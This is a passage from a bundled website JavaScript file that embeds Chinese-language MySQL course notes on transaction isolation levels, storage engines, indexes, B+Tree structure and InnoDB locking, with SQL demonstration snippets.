\r\n  -- 查询账户表\r\n  select * from account;\r\n  \r\n  -- 提交事务\r\n  commit;\r\n  \r\n  -- 查询账户表\r\n  select * from account;\r\n  ```\r\n\r\n- 幻读的问题和解决\r\n\r\n  - 窗口1\r\n\r\n  ```mysql\r\n  -- 设置隔离级别为repeatable read\r\n  set global transaction isolation level repeatable read;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 添加一条记录\r\n  INSERT INTO account VALUES (3,'王五',1500);\r\n  \r\n  -- 查询账户表，本窗口可以查看到id为3的结果\r\n  SELECT * FROM account;\r\n  \r\n  -- 提交事务\r\n  COMMIT;\r\n  ```\r\n\r\n  - 窗口2\r\n\r\n  ```mysql\r\n  -- 查询隔离级别\r\n  select @@tx_isolation;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 查询账户表，查询不到新添加的id为3的记录\r\n  select * from account;\r\n  \r\n  -- 添加id为3的一条数据，发现添加失败。出现了幻读\r\n  INSERT INTO account VALUES (3,'测试',200);\r\n  \r\n  -- 提交事务\r\n  COMMIT;\r\n  \r\n  -- 查询账户表，查询到了新添加的id为3的记录\r\n  select * from account;\r\n  ```\r\n\r\n  - 解决幻读的问题\r\n\r\n  ```mysql\r\n  /*\r\n  \t窗口1\r\n  */\r\n  -- 设置隔离级别为serializable\r\n  set global transaction isolation level serializable;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 添加一条记录\r\n  INSERT INTO account VALUES (4,'赵六',1600);\r\n  \r\n  -- 查询账户表，本窗口可以查看到id为4的结果\r\n  SELECT * FROM account;\r\n  \r\n  -- 提交事务\r\n  COMMIT;\r\n  \r\n  \r\n  \r\n  /*\r\n  \t窗口2\r\n  */\r\n  -- 查询隔离级别\r\n  select @@tx_isolation;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 查询账户表，发现查询语句无法执行，数据表被锁住！只有窗口1提交事务后，才可以继续操作\r\n  select * from account;\r\n  \r\n  -- 添加id为4的一条数据，发现已经存在了，就不会再添加了！幻读的问题被解决\r\n  INSERT INTO account VALUES (4,'测试',200);\r\n  \r\n  -- 提交事务\r\n  COMMIT;\r\n  ```\r\n\r\n#### 9.隔离级别总结\r\n\r\n|      | 隔离级别             | 名称     | 出现脏读 | 出现不可重复读 | 出现幻读 | 数据库默认隔离级别  |\r\n| ---- | -------------------- | -------- | -------- | -------------- | -------- | ------------------- |\r\n| 1    | **read uncommitted** | 读未提交 | 是       | 是             | 是       |                     |\r\n| 2    | **read committed**   | 读已提交 | 否       | 是             | 是       | Oracle / SQL Server |\r\n| 3    | **repeatable read**  | 可重复读 | 否       | 否             | 是       | MySQL               |\r\n| 4    | **serializable **    | 串行化   | 否       | 否             | 否       |                     |\r\n\r\n> 注意：隔离级别从小到大安全性越来越高，但是效率越来越低 , 所以不建议使用READ UNCOMMITTED 和 SERIALIZABLE 隔离级别.\r\n\r\n#### 10.事务的总结\r\n\r\n- 一条或多条 SQL 语句组成一个执行单元，其特点是这个单元要么同时成功要么同时失败。例如转账操作\r\n- 开启事务：start transaction;\r\n- 回滚事务：rollback;\r\n- 提交事务：commit;\r\n- 事务四大特征\r\n  - 原子性\r\n  - 持久性\r\n  - 隔离性\r\n  - 一致性\r\n- 事务的隔离级别\r\n  - read uncommitted(读未提交)\r\n  - read committed (读已提交)\r\n  - repeatable read (可重复读)\r\n  - serializable (串行化)\r\n\r\n",tn={data:function(){return{MainComponent:rn}}},en=tn,an=Object(u["a"])(en,Z,nn,!1,null,"665818fa",null),sn=an.exports,on=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},ln=[],cn='\x3c!--\r\n * @Date           : 2021-04-11 02:20:56\r\n * @FilePath       : /jinnian-space/src/pages/sql/module/mysql/md/MySQL高级-04-授课笔记.md\r\n * @Description    : \r\n--\x3e\r\n# MySQL高级-04-授课笔记\r\n\r\n### 一、MySQL存储引擎\r\n\r\n#### 1.MySQL体系结构\r\n\r\n- 体系结构的概念\r\n\r\n  - 任何一套系统当中，每个部件都能起到一定的作用！\r\n\r\n- MySQL的体系结构\r\n\r\n![02](./img/sql/mysql/MySQL高级-04-授课笔记.assets/02.png)\r\n\r\n- 体系结构详解\r\n  - 客户端连接\r\n    - 支持接口：支持的客户端连接，例如C、Java、PHP等语言来连接MySQL数据库\r\n  - 第一层：网络连接层\r\n    - 连接池：管理、缓冲用户的连接，线程处理等需要缓存的需求。\r\n    - 例如：当客户端发送一个请求连接，会从连接池中获取一个连接进行使用。\r\n  - 第二层：核心服务层\r\n    - 管理服务和工具：系统的管理和控制工具，例如备份恢复、复制、集群等。 \r\n    - SQL接口：接受SQL命令，并且返回查询结果。\r\n    - 查询解析器：验证和解析SQL命令，例如过滤条件、语法结构等。 \r\n    - 查询优化器：在执行查询之前，使用默认的一套优化机制进行优化sql语句\r\n    - 缓存：如果缓存当中有想查询的数据，则直接将缓存中的数据返回。没有的话再重新查询！\r\n  - 第三层：存储引擎层\r\n    - 插件式存储引擎：管理和操作数据的一种机制，包括(存储数据、如何更新、查询数据等)\r\n  - 第四层：系统文件层\r\n    - 文件系统：配置文件、数据文件、日志文件、错误文件、二进制文件等等的保存\r\n\r\n#### 2.MySQL存储引擎\r\n\r\n- 引擎的概念\r\n\r\n  - 生活中，引擎就是整个机器运行的核心，不同的引擎具备不同的功能。\r\n\r\n- MySQL存储引擎的概念\r\n  - MySQL数据库使用不同的机制存取表文件 , 机制的差别在于不同的存储方式、索引技巧、锁定水平以及广泛的不同的功能和能力，在MySQL中 , 将这些不同的技术及配套的功能称为**存储引擎**\r\n  - 在关系型数据库中数据的存储是以表的形式存进行储的，所以存储引擎也可以称为**表类型**（即存储和操作此表的类型）。\r\n  - Oracle , SqlServer等数据库只有一种存储引擎 , 而MySQL针对不同的需求, 配置MySQL的不同的存储引擎 , 就会让数据库采取了不同的处理数据的方式和扩展功能。\r\n  - 通过选择不同的引擎 ,能够获取最佳的方案 ,  也能够获得额外的速度或者功能，提高程序的整体效果。所以了解引擎的特性 , 才能贴合我们的需求 , 更好的发挥数据库的性能。\r\n- MySQL支持的存储引擎\r\n  - MySQL5.7支持的引擎包括：InnoDB、MyISAM、MEMORY、Archive、Federate、CSV、BLACKHOLE等\r\n  - 其中较为常用的有三种：InnoDB、MyISAM、MEMORY\r\n\r\n#### 3.常用引擎的特性对比\r\n\r\n- 常用的存储引擎\r\n  - MyISAM存储引擎\r\n    - 访问快,不支持事务和外键。表结构保存在.frm文件中，表数据保存在.MYD文件中，索引保存在.MYI文件中。\r\n  - InnoDB存储引擎(MySQL5.5版本后默认的存储引擎)\r\n    - 支持事务 ,占用磁盘空间大 ,支持并发控制。表结构保存在.frm文件中，如果是共享表空间，数据和索引保存在 innodb_data_home_dir 和 innodb_data_file_path定义的表空间中，可以是多个文件。如果是多表空间存储，每个表的数据和索引单独保存在 .ibd 中。\r\n  - MEMORY存储引擎\r\n    - 内存存储 , 速度快 ,不安全 ,适合小量快速访问的数据。表结构保存在.frm中。\r\n- 特性对比\r\n\r\n| 特性         | MyISAM                       | InnoDB        | MEMORY             |\r\n| ------------ | ---------------------------- | ------------- | ------------------ |\r\n| 存储限制     | 有(平台对文件系统大小的限制) | 64TB          | 有(平台的内存限制) |\r\n| **事务安全** | **不支持**                   | **支持**      | **不支持**         |\r\n| **锁机制**   | **表锁**                     | **表锁/行锁** | **表锁**           |\r\n| B+Tree索引   | 支持                         | 支持          | 支持               |\r\n| 哈希索引     | 不支持                       | 不支持        | 支持               |\r\n| 全文索引     | 支持                         | 支持          | 不支持             |\r\n| **集群索引** | **不支持**                   | **支持**      | **不支持**         |\r\n| 数据索引     | 不支持                       | 支持          | 支持               |\r\n| 数据缓存     | 不支持                       | 支持          | N/A                |\r\n| 索引缓存     | 支持                         | 支持          | N/A                |\r\n| 数据可压缩   | 支持                         | 不支持        | 不支持             |\r\n| 空间使用     | 低                           | 高            | N/A                |\r\n| 内存使用     | 低                           | 高            | 中等               |\r\n| 批量插入速度 | 高                           | 低            | 高                 |\r\n| **外键**     | **不支持**                   | **支持**      | **不支持**         |\r\n\r\n#### 4.引擎的操作\r\n\r\n- 查询数据库支持的引擎\r\n\r\n```mysql\r\n-- 标准语法\r\nSHOW ENGINES;\r\n\r\n-- 查询数据库支持的存储引擎\r\nSHOW ENGINES;\r\n```\r\n\r\n```mysql\r\n-- 表含义:\r\n  - support : 指服务器是否支持该存储引擎\r\n  - transactions : 指存储引擎是否支持事务\r\n  - XA : 指存储引擎是否支持分布式事务处理\r\n  - Savepoints : 指存储引擎是否支持保存点\r\n```\r\n\r\n- 查询某个数据库中所有数据表的引擎\r\n\r\n```mysql\r\n-- 标准语法\r\nSHOW TABLE STATUS FROM 数据库名称;\r\n\r\n-- 查看db9数据库所有表的存储引擎\r\nSHOW TABLE STATUS FROM db9;\r\n```\r\n\r\n- 查询某个数据库中某个数据表的引擎\r\n\r\n```mysql\r\n-- 标准语法\r\nSHOW TABLE STATUS FROM 数据库名称 WHERE NAME = \'数据表名称\';\r\n\r\n-- 查看db9数据库中stu_score表的存储引擎\r\nSHOW TABLE STATUS FROM db9 WHERE NAME = \'stu_score\';\r\n```\r\n\r\n- 创建数据表，指定存储引擎\r\n\r\n```mysql\r\n-- 标准语法\r\nCREATE TABLE 表名(\r\n\t列名,数据类型,\r\n    ...\r\n)ENGINE = 引擎名称;\r\n\r\n-- 创建db11数据库\r\nCREATE DATABASE db11;\r\n\r\n-- 使用db11数据库\r\nUSE db11;\r\n\r\n-- 创建engine_test表，指定存储引擎为MyISAM\r\nCREATE TABLE engine_test(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(10)\r\n)ENGINE = MYISAM;\r\n\r\n-- 查询engine_test表的引擎\r\nSHOW TABLE STATUS FROM db11 WHERE NAME = \'engine_test\';\r\n```\r\n\r\n- 修改表的存储引擎\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 ENGINE = 引擎名称;\r\n\r\n-- 修改engine_test表的引擎为InnoDB\r\nALTER TABLE engine_test ENGINE = INNODB;\r\n\r\n-- 查询engine_test表的引擎\r\nSHOW TABLE STATUS FROM db11 WHERE NAME = \'engine_test\';\r\n```\r\n\r\n#### 5.总结：引擎的选择\r\n\r\n- MyISAM ：由于MyISAM不支持事务、不支持外键、支持全文检索和表级锁定，读写相互阻塞，读取速度快，节约资源，所以如果应用是以**查询操作**和**插入操作**为主，只有很少的**更新和删除**操作，并且对事务的完整性、并发性要求不是很高，那么选择这个存储引擎是非常合适的。\r\n- InnoDB : 是MySQL的默认存储引擎， 由于InnoDB支持事务、支持外键、行级锁定 ，支持所有辅助索引(5.5.5后不支持全文检索)，高缓存，所以用于对事务的完整性有比较高的要求，在并发条件下要求数据的一致性，读写频繁的操作，那么InnoDB存储引擎是比较合适的选择，比如BBS、计费系统、充值转账等\r\n- MEMORY：将所有数据保存在RAM中，在需要快速定位记录和其他类似数据环境下，可以提供更快的访问。MEMORY的缺陷就是对表的大小有限制，太大的表无法缓存在内存中，其次是要确保表的数据可以恢复，数据库异常终止后表中的数据是可以恢复的。MEMORY表通常用于更新不太频繁的小表，用以快速得到访问结果。\r\n- 总结：针对不同的需求场景，来选择最适合的存储引擎即可！如果不确定、则使用数据库默认的存储引擎！\r\n\r\n### 二、MySQL索引\r\n\r\n#### 1.索引的概念\r\n\r\n- 我们之前学习过集合，其中的ArrayList集合的特点之一就是有索引。那么有索引会带来哪些好处呢？\r\n- 没错，查询数据快！我们可以通过索引来快速查找到想要的数据。那么对于我们的MySQL数据库中的索引功能也是类似的！\r\n- MySQL数据库中的索引：是帮助MySQL高效获取数据的一种数据结构！所以，索引的本质就是数据结构。\r\n- 在表数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式指向数据， 这样就可以在这些数据结构上实现高级查找算法，这种数据结构就是索引。\r\n- 一张数据表，用于保存数据。   一个索引配置文件，用于保存索引，每个索引都去指向了某一个数据(表格演示)\r\n- 举例，无索引和有索引的查找原理\r\n\r\n![04](./img/sql/mysql/MySQL高级-04-授课笔记.assets/04.png)\r\n\r\n#### 2.索引的分类\r\n\r\n- 功能分类 \r\n  - 普通索引： 最基本的索引，它没有任何限制。\r\n  - 唯一索引：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值组合必须唯一。\r\n  - 主键索引：一种特殊的唯一索引，不允许有空值。一般在建表时同时创建主键索引。\r\n  - 组合索引：顾名思义，就是将单列索引进行组合。\r\n  - 外键索引：只有InnoDB引擎支持外键索引，用来保证数据的一致性、完整性和实现级联操作。\r\n  - 全文索引：快速匹配全部文档的方式。InnoDB引擎5.6版本后才支持全文索引。MEMORY引擎不支持。\r\n- 结构分类\r\n  - B+Tree索引 ：MySQL使用最频繁的一个索引数据结构，是InnoDB和MyISAM存储引擎默认的索引类型。\r\n  - Hash索引 : MySQL中Memory存储引擎默认支持的索引类型。\r\n\r\n#### 3.索引的操作\r\n\r\n- 数据准备\r\n\r\n```mysql\r\n-- 创建db12数据库\r\nCREATE DATABASE db12;\r\n\r\n-- 使用db12数据库\r\nUSE db12;\r\n\r\n-- 创建student表\r\nCREATE TABLE student(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(10),\r\n\tage INT,\r\n\tscore INT\r\n);\r\n-- 添加数据\r\nINSERT INTO student VALUES (NULL,\'张三\',23,98),(NULL,\'李四\',24,95),\r\n(NULL,\'王五\',25,96),(NULL,\'赵六\',26,94),(NULL,\'周七\',27,99);\r\n```\r\n\r\n- 创建索引\r\n  - 注意：如果一个表中有一列是主键，那么就会默认为其创建主键索引！(主键列不需要单独创建索引)\r\n\r\n```mysql\r\n-- 标准语法\r\nCREATE [UNIQUE|FULLTEXT] INDEX 索引名称\r\n[USING 索引类型]  -- 默认是B+TREE\r\nON 表名(列名...);\r\n\r\n-- 为student表中姓名列创建一个普通索引\r\nCREATE INDEX idx_name ON student(NAME);\r\n\r\n-- 为student表中年龄列创建一个唯一索引\r\nCREATE UNIQUE INDEX idx_age ON student(age);\r\n```\r\n\r\n- 查看索引\r\n\r\n```mysql\r\n-- 标准语法\r\nSHOW INDEX FROM 表名;\r\n\r\n-- 查看student表中的索引\r\nSHOW INDEX FROM student;\r\n```\r\n\r\n- alter语句添加索引\r\n\r\n```mysql\r\n-- 普通索引\r\nALTER TABLE 表名 ADD INDEX 索引名称(列名);\r\n\r\n-- 组合索引\r\nALTER TABLE 表名 ADD INDEX 索引名称(列名1,列名2,...);\r\n\r\n-- 主键索引\r\nALTER TABLE 表名 ADD PRIMARY KEY(主键列名); \r\n\r\n-- 外键索引(添加外键约束，就是外键索引)\r\nALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名);\r\n\r\n-- 唯一索引\r\nALTER TABLE 表名 ADD UNIQUE 索引名称(列名);\r\n\r\n-- 全文索引(mysql只支持文本类型)\r\nALTER TABLE 表名 ADD FULLTEXT 索引名称(列名);\r\n\r\n\r\n-- 为student表中name列添加全文索引\r\nALTER TABLE student ADD FULLTEXT idx_fulltext_name(name);\r\n\r\n-- 查看student表中的索引\r\nSHOW INDEX FROM student;\r\n```\r\n\r\n- 删除索引\r\n\r\n```mysql\r\n-- 标准语法\r\nDROP INDEX 索引名称 ON 表名;\r\n\r\n-- 删除student表中的idx_score索引\r\nDROP INDEX idx_score ON student;\r\n\r\n-- 查看student表中的索引\r\nSHOW INDEX FROM student;\r\n```\r\n\r\n#### 4.索引效率的测试\r\n\r\n```mysql\r\n-- 创建product商品表\r\nCREATE TABLE product(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,  -- 商品id\r\n\tNAME VARCHAR(10),\t\t    -- 商品名称\r\n\tprice INT                           -- 商品价格\r\n);\r\n\r\n-- 定义存储函数，生成长度为10的随机字符串并返回\r\nDELIMITER $\r\n\r\nCREATE FUNCTION rand_string() \r\nRETURNS VARCHAR(255)\r\nBEGIN\r\n\tDECLARE big_str VARCHAR(100) DEFAULT \'abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ\';\r\n\tDECLARE small_str VARCHAR(255) DEFAULT \'\';\r\n\tDECLARE i INT DEFAULT 1;\r\n\t\r\n\tWHILE i <= 10 DO\r\n\t\tSET small_str =CONCAT(small_str,SUBSTRING(big_str,FLOOR(1+RAND()*52),1));\r\n\t\tSET i=i+1;\r\n\tEND WHILE;\r\n\t\r\n\tRETURN small_str;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n\r\n\r\n-- 定义存储过程，添加100万条数据到product表中\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test()\r\nBEGIN\r\n\tDECLARE num INT DEFAULT 1;\r\n\t\r\n\tWHILE num <= 1000000 DO\r\n\t\tINSERT INTO product VALUES (NULL,rand_string(),num);\r\n\t\tSET num = num + 1;\r\n\tEND WHILE;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用存储过程\r\nCALL pro_test();\r\n\r\n\r\n-- 查询总记录条数\r\nSELECT COUNT(*) FROM product;\r\n\r\n\r\n\r\n-- 查询product表的索引\r\nSHOW INDEX FROM product;\r\n\r\n-- 查询name为OkIKDLVwtG的数据   (0.049)\r\nSELECT * FROM product WHERE NAME=\'OkIKDLVwtG\';\r\n\r\n-- 通过id列查询OkIKDLVwtG的数据  (1毫秒)\r\nSELECT * FROM product WHERE id=999998;\r\n\r\n-- 为name列添加索引\r\nALTER TABLE product ADD INDEX idx_name(NAME);\r\n\r\n-- 查询name为OkIKDLVwtG的数据   (0.001)\r\nSELECT * FROM product WHERE NAME=\'OkIKDLVwtG\';\r\n\r\n\r\n/*\r\n\t范围查询\r\n*/\r\n-- 查询价格为800~1000之间的所有数据 (0.052)\r\nSELECT * FROM product WHERE price BETWEEN 800 AND 1000;\r\n\r\n/*\r\n\t排序查询\r\n*/\r\n-- 查询价格为800~1000之间的所有数据,降序排列  (0.083)\r\nSELECT * FROM product WHERE price BETWEEN 800 AND 1000 ORDER BY price DESC;\r\n\r\n-- 为price列添加索引\r\nALTER TABLE product ADD INDEX idx_price(price);\r\n\r\n-- 查询价格为800~1000之间的所有数据 (0.011)\r\nSELECT * FROM product WHERE price BETWEEN 800 AND 1000;\r\n\r\n-- 查询价格为800~1000之间的所有数据,降序排列  (0.001)\r\nSELECT * FROM product WHERE price BETWEEN 800 AND 1000 ORDER BY price DESC;\r\n```\r\n\r\n#### 5.索引的实现原则\r\n\r\n- 索引是在MySQL的存储引擎中实现的，所以每种存储引擎的索引不一定完全相同，也不是所有的引擎支持所有的索引类型。这里我们主要介绍InnoDB引擎的实现的**B+Tree索引**。\r\n- B+Tree是一种树型数据结构，是B-Tree的变种。通常使用在数据库和操作系统中的文件系统，特点是能够保持数据稳定有序。我们逐步的来了解一下。\r\n\r\n##### 5.1磁盘存储\r\n\r\n- 系统从磁盘读取数据到内存时是以磁盘块（block）为基本单位的\r\n- 位于同一个磁盘块中的数据会被一次性读取出来，而不是需要什么取什么。\r\n- InnoDB存储引擎中有页（Page）的概念，页是其磁盘管理的最小单位。InnoDB存储引擎中默认每个页的大小为16KB。\r\n- InnoDB引擎将若干个地址连接磁盘块，以此来达到页的大小16KB，在查询数据时如果一个页中的每条数据都能有助于定位数据记录的位置，这将会减少磁盘I/O次数，提高查询效率。\r\n\r\n##### 5.2BTree\r\n\r\n- BTree结构的数据可以让系统高效的找到数据所在的磁盘块。为了描述BTree，首先定义一条记录为一个二元组[key, data] ，key为记录的键值，对应表中的主键值，data为一行记录中除主键外的数据。对于不同的记录，key值互不相同。BTree中的每个节点根据实际情况可以包含大量的关键字信息和分支，如下图所示为一个3阶的BTree： \r\n\r\n  ![05](./img/sql/mysql/MySQL高级-04-授课笔记.assets/05.png)\r\n\r\n- 根据图中结构显示，每个节点占用一个盘块的磁盘空间，一个节点上有两个升序排序的关键字和三个指向子树根节点的指针，指针存储的是子节点所在磁盘块的地址。两个关键词划分成的三个范围域对应三个指针指向的子树的数据的范围域。以根节点为例，关键字为17和35，P1指针指向的子树的数据范围为小于17，P2指针指向的子树的数据范围为17~35，P3指针指向的子树的数据范围为大于35。\r\n\r\n查找顺序：\r\n\r\n```mysql\r\n模拟查找15的过程 : \r\n\r\n1.根节点找到磁盘块1，读入内存。【磁盘I/O操作第1次】\r\n\t比较关键字15在区间（<17），找到磁盘块1的指针P1。\r\n2.P1指针找到磁盘块2，读入内存。【磁盘I/O操作第2次】\r\n\t比较关键字15在区间（>12），找到磁盘块2的指针P3。\r\n3.P3指针找到磁盘块7，读入内存。【磁盘I/O操作第3次】\r\n\t在磁盘块7中找到关键字15。\r\n\t\r\n-- 分析上面过程，发现需要3次磁盘I/O操作，和3次内存查找操作。\r\n-- 由于内存中的关键字是一个有序表结构，可以利用二分法查找提高效率。而3次磁盘I/O操作是影响整个BTree查找效率的决定因素。BTree使用较少的节点个数，使每次磁盘I/O取到内存的数据都发挥了作用，从而提高了查询效率。\r\n```\r\n\r\n##### 5.3B+Tree\r\n\r\n- B+Tree是在BTree基础上的一种优化，使其更适合实现外存储索引结构，InnoDB存储引擎就是用B+Tree实现其索引结构。\r\n- 从上一节中的BTree结构图中可以看到每个节点中不仅包含数据的key值，还有data值。而每一个页的存储空间是有限的，如果data数据较大时将会导致每个节点（即一个页）能存储的key的数量很小，当存储的数据量很大时同样会导致B-Tree的深度较大，增大查询时的磁盘I/O次数，进而影响查询效率。在B+Tree中，所有数据记录节点都是按照键值大小顺序存放在同一层的叶子节点上，而非叶子节点上只存储key值信息，这样可以大大加大每个节点存储的key值数量，降低B+Tree的高度。\r\n- B+Tree相对于BTree区别：\r\n  - 非叶子节点只存储键值信息。\r\n  - 所有叶子节点之间都有一个连接指针。\r\n  - 数据记录都存放在叶子节点中。\r\n- 将上一节中的BTree优化，由于B+Tree的非叶子节点只存储键值信息，假设每个磁盘块能存储4个键值及指针信息，则变成B+Tree后其结构如下图所示：\r\n\r\n![06](./img/sql/mysql/MySQL高级-04-授课笔记.assets/06.png)\r\n\r\n通常在B+Tree上有两个头指针，一个指向根节点，另一个指向关键字最小的叶子节点，而且所有叶子节点（即数据节点）之间是一种链式环结构。因此可以对B+Tree进行两种查找运算：\r\n\r\n- 【有范围】对于主键的范围查找和分页查找\r\n- 【有顺序】从根节点开始，进行随机查找\r\n\r\n实际情况中每个节点可能不能填充满，因此在数据库中，B+Tree的高度一般都在2~4层。MySQL的InnoDB存储引擎在设计时是将根节点常驻内存的，也就是说查找某一键值的行记录时最多只需要1~3次磁盘I/O操作。\r\n\r\n#### 6.总结：索引的设计原则\r\n\r\n索引的设计可以遵循一些已有的原则，创建索引的时候请尽量考虑符合这些原则，便于提升索引的使用效率，更高效的使用索引。\r\n\r\n- 创建索引时的原则\r\n  - 对查询频次较高，且数据量比较大的表建立索引。\r\n  - 使用唯一索引，区分度越高，使用索引的效率越高。\r\n  - 索引字段的选择，最佳候选列应当从where子句的条件中提取，如果where子句中的组合比较多，那么应当挑选最常用、过滤效果最好的列的组合。\r\n  - 使用短索引，索引创建之后也是使用硬盘来存储的，因此提升索引访问的I/O效率，也可以提升总体的访问效率。假如构成索引的字段总长度比较短，那么在给定大小的存储块内可以存储更多的索引值，相应的可以有效的提升MySQL访问索引的I/O效率。\r\n  - 索引可以有效的提升查询数据的效率，但索引数量不是多多益善，索引越多，维护索引的代价自然也就水涨船高。对于插入、更新、删除等DML操作比较频繁的表来说，索引过多，会引入相当高的维护代价，降低DML操作的效率，增加相应操作的时间消耗。另外索引过多的话，MySQL也会犯选择困难病，虽然最终仍然会找到一个可用的索引，但无疑提高了选择的代价。\r\n- 联合索引的特点\r\n\r\n在mysql建立联合索引时会遵循最左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配，\r\n对列name列、address和列phone列建一个联合索引\r\n\r\n```mysql\r\nALTER TABLE user ADD INDEX index_three(name,address,phone);\r\n```\r\n\r\n联合索引index_three实际建立了(name)、(name,address)、(name,address,phone)三个索引。所以下面的三个SQL语句都可以命中索引。\r\n\r\n```mysql\r\nSELECT * FROM user WHERE address = \'北京\' AND phone = \'12345\' AND name = \'张三\';\r\nSELECT * FROM user WHERE name = \'张三\' AND address = \'北京\';\r\nSELECT * FROM user WHERE name = \'张三\';\r\n```\r\n\r\n上面三个查询语句执行时会依照最左前缀匹配原则，检索时分别会使用索引\r\n\r\n```\r\n(name,address,phone)\r\n(name,address)\r\n(name)\r\n```\r\n\r\n进行数据匹配。\r\n\r\n索引的字段可以是任意顺序的，如：\r\n\r\n```mysql\r\n-- 优化器会帮助我们调整顺序，下面的SQL语句都可以命中索引\r\nSELECT * FROM user WHERE address = \'北京\' AND phone = \'12345\' AND name = \'张三\';\r\n```\r\n\r\nMysql的优化器会帮助我们调整where条件中的顺序，以匹配我们建立的索引。\r\n\r\n联合索引中最左边的列不包含在条件查询中，所以根据上面的原则，下面的SQL语句就不会命中索引。\r\n\r\n```mysql\r\n-- 联合索引中最左边的列不包含在条件查询中，下面的SQL语句就不会命中索引\r\nSELECT * FROM user WHERE address = \'北京\' AND phone = \'12345\';\r\n```\r\n\r\n### 三、MySQL锁\r\n\r\n#### 1.锁的概念\r\n\r\n- 之前我们学习过多线程，多线程当中如果想保证数据的准确性是如何实现的呢？没错，通过同步实现。同步就相当于是加锁。加了锁以后有什么好处呢？当一个线程真正在操作数据的时候，其他线程只能等待。当一个线程执行完毕后，释放锁。其他线程才能进行操作！\r\n\r\n- 那么我们的MySQL数据库中的锁的功能也是类似的。在我们学习事务的时候，讲解过事务的隔离性，可能会出现脏读、不可重复读、幻读的问题，当时我们的解决方式是通过修改事务的隔离级别来控制，但是数据库的隔离级别呢我们并不推荐修改。所以，锁的作用也可以解决掉之前的问题！\r\n\r\n- 锁机制 : 数据库为了保证数据的一致性，而使用各种共享的资源在被并发访问时变得有序所设计的一种规则。\r\n\r\n- 举例，在电商网站购买商品时，商品表中只存有1个商品，而此时又有两个人同时购买，那么谁能买到就是一个关键的问题。\r\n\r\n  这里会用到事务进行一系列的操作：\r\n\r\n  1. 先从商品表中取出物品的数据\r\n  2. 然后插入订单\r\n  3. 付款后，再插入付款表信息\r\n  4. 更新商品表中商品的数量\r\n\r\n  以上过程中，使用锁可以对商品数量数据信息进行保护，实现隔离，即只允许第一位用户完成整套购买流程，而其他用户只能等待，这样就解决了并发中的矛盾问题。\r\n\r\n- 在数据库中，数据是一种供许多用户共享访问的资源，如何保证数据并发访问的一致性、有效性，是所有数据库必须解决的一个问题，MySQL由于自身架构的特点，在不同的存储引擎中，都设计了面对特定场景的锁定机制，所以引擎的差别，导致锁机制也是有很大差别的。\r\n\r\n#### 2.锁的分类\r\n\r\n- 按操作分类：\r\n  - 共享锁：也叫读锁。针对同一份数据，多个事务读取操作可以同时加锁而不互相影响 ，但是不能修改数据记录。\r\n  - 排他锁：也叫写锁。当前的操作没有完成前,会阻断其他操作的读取和写入\r\n- 按粒度分类：\r\n  - 表级锁：操作时，会锁定整个表。开销小，加锁快；不会出现死锁；锁定力度大，发生锁冲突概率高，并发度最低。偏向于MyISAM存储引擎！\r\n  - 行级锁：操作时，会锁定当前操作行。开销大，加锁慢；会出现死锁；锁定粒度小，发生锁冲突的概率低，并发度高。偏向于InnoDB存储引擎！\r\n  - 页级锁：锁的粒度、发生冲突的概率和加锁的开销介于表锁和行锁之间，会出现死锁，并发性能一般。\r\n- 按使用方式分类：\r\n  - 悲观锁：每次查询数据时都认为别人会修改，很悲观，所以查询时加锁。\r\n  - 乐观锁：每次查询数据时都认为别人不会修改，很乐观，但是更新时会判断一下在此期间别人有没有去更新这个数据\r\n- 不同存储引擎支持的锁\r\n\r\n| 存储引擎 | 表级锁 | 行级锁 | 页级锁 |\r\n| -------- | ------ | ------ | ------ |\r\n| MyISAM   | 支持   | 不支持 | 不支持 |\r\n| InnoDB   | 支持   | 支持   | 不支持 |\r\n| MEMORY   | 支持   | 不支持 | 不支持 |\r\n| BDB      | 支持   | 不支持 | 支持   |\r\n\r\n#### 3.演示InnoDB锁\r\n\r\n- 数据准备\r\n\r\n```mysql\r\n-- 创建db13数据库\r\nCREATE DATABASE db13;\r\n\r\n-- 使用db13数据库\r\nUSE db13;\r\n\r\n-- 创建student表\r\nCREATE TABLE student(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(10),\r\n\tage INT,\r\n\tscore INT\r\n);\r\n-- 添加数据\r\nINSERT INTO student VALUES (NULL,\'张三\',23,99),(NULL,\'李四\',24,95),\r\n(NULL,\'王五\',25,98),(NULL,\'赵六\',26,97);\r\n```\r\n\r\n- 共享锁\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT语句 LOCK IN SHARE MODE;\r\n```\r\n\r\n```mysql\r\n-- 窗口1\r\n/*\r\n\t共享锁：数据可以被多个事务查询，但是不能修改\r\n*/\r\n-- 开启事务\r\nSTART TRANSACTION;\r\n\r\n-- 查询id为1的数据记录。加入共享锁\r\nSELECT * FROM student WHERE id=1 LOCK IN SHARE MODE;\r\n\r\n-- 查询分数为99分的数据记录。加入共享锁\r\nSELECT * FROM student WHERE score=99 LOCK IN SHARE MODE;\r\n\r\n-- 提交事务\r\nCOMMIT;\r\n```\r\n\r\n```mysql\r\n-- 窗口2\r\n-- 开启事务\r\nSTART TRANSACTION;\r\n\r\n-- 查询id为1的数据记录(普通查询，可以查询)\r\nSELECT * FROM student WHERE id=1;\r\n\r\n-- 查询id为1的数据记录，并加入共享锁(可以查询。共享锁和共享锁兼容)\r\nSELECT * FROM student WHERE id=1 LOCK IN SHARE 